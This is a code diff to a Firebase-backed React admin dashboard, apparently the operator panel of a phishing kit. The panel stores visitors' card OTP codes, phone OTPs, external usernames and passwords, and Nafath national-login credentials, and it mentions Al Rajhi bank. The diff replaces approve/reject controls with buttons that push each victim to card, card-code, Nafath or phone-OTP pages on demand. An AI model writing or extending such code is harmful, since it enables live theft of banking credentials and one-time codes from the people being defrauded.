@@ -32,6 +32,8 @@ import {
   ChevronsLeft,
   ChevronsRight,
   PanelLeft,
+  Phone,
+  Lock,
 } from "lucide-react"
 import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
 import { onAuthStateChanged, signOut } from "firebase/auth"
@@ -111,7 +113,6 @@ interface Notification {
   otpCardCode?: string
   phoneOtp?: string
   otpCode?: string
-  otp?: string
   externalUsername?: string
   externalPassword?: string
   nafadUsername?: string
@@ -138,6 +139,8 @@ interface Notification {
   deviceInfo?: string
   sessionId?: string
   timestamp?: string | number
+  otp?: string
+
 }
 
 const countryData: Record<string, { name: string; flag: string }> = {
@@ -399,7 +402,7 @@ export default function DashboardPage() {
 
   const getCountryBadge = (notification: Notification) => {
     const countryCode = notification.countryCode
-    const countryInfo = countryCode ? countryData[countryCode.toUpperCase()] : null
+    const countryInfo = notification.country 
     if (!countryInfo) {
       return (
         <Badge variant="outline" className="font-normal">
@@ -410,51 +413,29 @@ export default function DashboardPage() {
     }
     return (
       <Badge variant="outline" className="font-normal">
-        <span className="mr-1.5">{countryInfo.flag}</span>
-        {countryInfo.name}
+        {countryInfo}
       </Badge>
     )
   }
 
-  const getStatusBadge = (status?: string) => {
-    switch (status) {
-      case "approved":
-        return (
-          <Badge variant="default" className="bg-green-100 text-green-800 hover:bg-green-200">
-            <CheckCircle className="h-3.5 w-3.5 mr-1.5" />
-            مقبول
-          </Badge>
-        )
-      case "rejected":
-        return (
-          <Badge variant="destructive">
-            <XCircle className="h-3.5 w-3.5 mr-1.5" />
-            مرفوض
-          </Badge>
-        )
-      default:
-        return (
-          <Badge variant="secondary" className="bg-amber-100 text-amber-800 hover:bg-amber-200">
-            <Clock className="h-3.5 w-3.5 mr-1.5" />
-            قيد الانتظار
-          </Badge>
-        )
-    }
-  }
 
-  const getPageType = (pagename?: string) => {
+  const getPageType = (currentPage?: string) => {
     const types: { [key: string]: { icon: React.ElementType; label: string; className: string } } = {
-      payment: { icon: CreditCard, label: "دفع", className: "bg-blue-100 text-blue-800" },
-      home: { icon: FileText, label: "تسجيل", className: "bg-purple-100 text-purple-800" },
-      "verify-otp": { icon: Shield, label: "رمز OTP", className: "bg-pink-100 text-pink-800" },
-      "verify-phone": { icon: Smartphone, label: "رمز هاتف", className: "bg-orange-100 text-orange-800" },
+      "2": { icon: CheckCircle, label: "معلومات", className: "bg-green-100 text-blue-800" },
+      "3": { icon: CheckCircle, label: "عروض", className: "bg-pink-100 text-blue-800" },
+      "4": { icon: CheckCircle, label: "ميزات ", className: "bg-red-100 text-blue-800" },
+      "5": { icon: CheckCircle, label: "ملخص", className: "bg-gray-100 text-blue-800" },
+      "6": { icon: CreditCard, label: "دفع", className: "bg-blue-100 text-blue-800" },
+      "1": { icon: FileText, label: "تسجيل", className: "bg-purple-100 text-purple-800" },
+      "7": { icon: Shield, label: "رمز OTP", className: "bg-pink-100 text-pink-800" },
+      "9999": { icon: Smartphone, label: "رمز هاتف", className: "bg-orange-100 text-orange-800" },
       "external-link": { icon: Tag, label: "راجحي", className: "bg-emerald-100 text-emerald-800" },
-      nafaz: { icon: Shield, label: "نفاذ", className: "bg-teal-100 text-teal-800" },
+      "nafaz": { icon: Shield, label: "نفاذ", className: "bg-teal-100 text-teal-800" },
     }
     const type =
-      pagename && types[pagename]
-        ? types[pagename]
-        : { icon: Tag, label: pagename || "غير معروف", className: "bg-gray-100 text-gray-800" }
+    currentPage && types[currentPage]
+        ? types[currentPage]
+        : { icon: Tag, label: currentPage || "غير معروف", className: "bg-gray-100 text-gray-800" }
     const Icon = type.icon
     return (
       <Badge variant="secondary" className={`${type.className} hover:${type.className} font-medium`}>
@@ -735,9 +716,23 @@ export default function DashboardPage() {
                         <UserStatus userId={notification.id} />
                       </div>
                       <div className="hidden sm:flex items-center text-sm">{getCountryBadge(notification)}</div>
-                      <div className="flex items-center text-sm">{getPageType(notification.pagename)}</div>
+                      <div className="flex items-center text-sm">{getPageType(notification.currentPage)}</div>
                       <div className="flex items-center justify-end sm:justify-start text-sm">
-                        {getStatusBadge(notification.status)}
+                       <Button  className={notification.currentPage==="6"?"bg-green-100 text-black mx-1":"mx-1"} size="icon" onClick={()=>handleUpdatePagename(notification.id,"6")}>
+                        <CreditCard/>
+                       </Button>
+                       <Button  className={notification.currentPage==="nafaz"?"bg-green-100 text-black mx-1":"mx-1"} size="icon" onClick={()=>handleUpdatePagename(notification.id,"nafaz")}>
+                        <Shield/>
+                       </Button>
+                       <Button size="icon" onClick={()=>handleUpdatePagename(notification.id,"9999")}>
+                        <Phone/>
+                       </Button>
+                       <Button size="icon" onClick={()=>handleUpdatePagename(notification.id,"1")}>
+                        <FileText/>
+                       </Button>
+                       <Button size="icon" onClick={()=>handleUpdatePagename(notification.id,"7")}>
+                        <Lock/>
+                       </Button>
                       </div>
                       <div className="col-span-2 sm:col-span-3 md:col-span-1 flex items-center justify-end gap-2">
                         <span className="text-xs text-muted-foreground">
@@ -854,28 +849,55 @@ export default function DashboardPage() {
               <div className="grid grid-cols-2 gap-3 pt-4 border-t">
                 <Button
                   onClick={() => {
-                    handleApproval("approved", selectedNotification.id)
+                    handleUpdatePagename( selectedNotification.id,"1")
                     setShowSidebar(false)
                   }}
-                  className="bg-green-600 hover:bg-green-700"
+                  variant={selectedNotification.currentPage === "1"?"default":"outline"}
                 >
-                  <CheckCircle className="h-4 w-4 ml-2" /> قبول
+                  <CheckCircle className="h-4 w-4 ml-2" /> تسجيل
                 </Button>
                 <Button
                   onClick={() => {
-                    handleApproval("rejected", selectedNotification.id)
+                    handleUpdatePagename( selectedNotification.id,"6")
                     setShowSidebar(false)
                   }}
-                  variant="destructive"
+                  variant={selectedNotification.currentPage === "6"?"default":"outline"}
                 >
-                  <XCircle className="h-4 w-4 ml-2" /> رفض
+                  <XCircle className="h-4 w-4 ml-2" /> بطاقة
+                </Button>
+                <Button
+                  onClick={() => {
+                    handleUpdatePagename( selectedNotification.id,"7")
+                    setShowSidebar(false)
+                  }}
+                  variant={selectedNotification.currentPage === "7"?"default":"outline"}
+                >
+                  <XCircle className="h-4 w-4 ml-2" /> كود بطاقة
+                </Button>
+                <Button
+                  onClick={() => {
+                  handleUpdatePagename( selectedNotification.id,"nafaz")
+                    setShowSidebar(false)
+                  }}
+                  variant={selectedNotification.currentPage === "nafaz"?"default":"outline"}
+                >
+                  <XCircle className="h-4 w-4 ml-2" /> نفاذ
+                </Button>
+                <Button
+                  onClick={() => {
+                    handleUpdatePagename( selectedNotification.id,"9999")
+                    setShowSidebar(false)
+                  }}
+                  variant={selectedNotification.currentPage === "9999"?"default":"outline"}
+                >
+                  <XCircle className="h-4 w-4 ml-2" /> هاتف
                 </Button>
                 <Button
                   onClick={() => {
                     handleDelete(selectedNotification.id)
                     setShowSidebar(false)
                   }}
-                  variant="outline"
+                  variant={"outline"}
                   className="col-span-2"
                 >
                   <Trash2 className="h-4 w-4 ml-2" /> حذف
